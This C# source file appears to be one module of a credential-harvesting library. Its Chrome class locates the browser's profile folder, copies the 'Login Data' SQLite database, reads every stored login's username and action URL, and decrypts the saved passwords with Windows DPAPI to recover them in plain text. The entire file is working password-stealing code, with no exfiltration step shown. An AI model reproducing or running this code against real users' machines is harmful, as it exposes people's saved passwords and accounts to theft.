using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using Community.CsharpSqlite;
using LibCredentials.PInvoke;

namespace LibCredentials.Targets
{
    public class Chrome : Target
    {
        private bool DecryptCryptFile(string cryptFilePath, ICollection<Credential> credentials)
        {
            if (!File.Exists(cryptFilePath))
                return false;

            var tmpCryptFilePath = cryptFilePath + "2";

            // Create tmp copy incase Chrome is using the file
            File.Copy(cryptFilePath, tmpCryptFilePath, true);

            Sqlite3.sqlite3 db;
            if (Sqlite3.sqlite3_open(tmpCryptFilePath, out db) != Sqlite3.SQLITE_OK)
                return false;

            var stmt = new Sqlite3.Vdbe();
            if (Sqlite3.sqlite3_prepare_v2(db, "SELECT * FROM Logins", -1, ref stmt, 0) != Sqlite3.SQLITE_OK)
            {
                Sqlite3.sqlite3_close(db);
                return false;
            }

            while (Sqlite3.sqlite3_step(stmt) == Sqlite3.SQLITE_ROW)
            {
                var credential = new Credential(TargetTypes.Chrome);
                for (var col = 0; col < Sqlite3.sqlite3_column_count(stmt); col++)
                {
                    var columnName = Sqlite3.sqlite3_column_name(stmt, col);
                    if (columnName == null)
                        continue;

                    if (columnName == "username_value")
                        credential.Username = Sqlite3.sqlite3_column_text(stmt, col);
                    else if (columnName == "password_value")
                    {
                        var columnBlob = Sqlite3.sqlite3_column_blob(stmt, col);
                        //var columnLength = Sqlite3.sqlite3_column_bytes(stmt, col);

                        var data = Crypt32.CryptUnprotectData(columnBlob);
                        if (data != null)
                            credential.Password = Encoding.UTF8.GetString(data);
                    }
                    else if (columnName == "action_url")
                        credential.Extra = Sqlite3.sqlite3_column_text(stmt, col);
                }

                if ((credential.Username.Length > 0) && (credential.Password.Length > 0))
                    credentials.Add(credential);
            }

            Sqlite3.sqlite3_finalize(stmt);
            Sqlite3.sqlite3_close(db);

            File.Delete(tmpCryptFilePath);
            return true;
        }

        private string GetChromeProfilePath()
        {
            var profilePath = Environment.GetEnvironmentVariable("appdata");
            if (profilePath == null)
                throw new Exception("profilePath == null");

            if (Environment.OSVersion.Version.Major > 5) // vista or higher
                profilePath = profilePath.Replace("\\Roaming", "\\Local");

            return profilePath + "\\Google\\Chrome\\User Data\\Default\\";
        }

        protected override void _GetCredentials(List<Credential> credentials)
        {
            var profilePath = GetChromeProfilePath();
            if (!Directory.Exists(profilePath))
                return;

            DecryptCryptFile(profilePath + "Login Data", credentials);
            DecryptCryptFile(profilePath + "Login Data2", credentials);
        }
    }
}